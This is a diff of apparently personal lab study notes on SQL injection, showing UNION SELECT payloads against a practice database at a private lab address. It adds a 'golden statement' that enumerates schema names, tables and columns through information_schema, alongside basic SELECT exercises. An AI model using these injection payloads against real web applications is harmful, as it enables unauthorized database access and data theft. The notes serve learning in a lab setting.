@@ -72,7 +72,7 @@ Audi ' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #
 Audi ' UNION SELECT carid,name,color,cost,5 FROM sessin.car #         wont shoow column 2 due to it being hidden
 ```
 ## use placeholders when there are more columns than values youre looking for 
-### DEMO GET (search bar)
+### DEMO GET (search bar) USE MORE
 ```
 http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit      replace submit=submit
 # In the search bar replace & with:
@@ -146,7 +146,7 @@ SELECT Director FROM Movies; gets directrs from movies
 SELECT Title FROM Movies;
 SELECT Title,Director FROM Movies;
 SELECT Title,Year FROM Movies; 
-SELECT * FROM Movies; gets all information from mthe movies table 
+SELECT * FROM Movies; gets all columns from mthe movies table 
 SELECT <column> FROM <table>
 
 SELECT id, title FROM movies    finds the movie with the id of 6
@@ -209,4 +209,6 @@ Joe	vato
 #6
 switch sqlinjection to payments table 
 
-
+## golden statement
+  ' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns #
+      >use placeholders when we n eed more columns like numbers, also this is a baseline and will help set up and carry the rest of the injections 
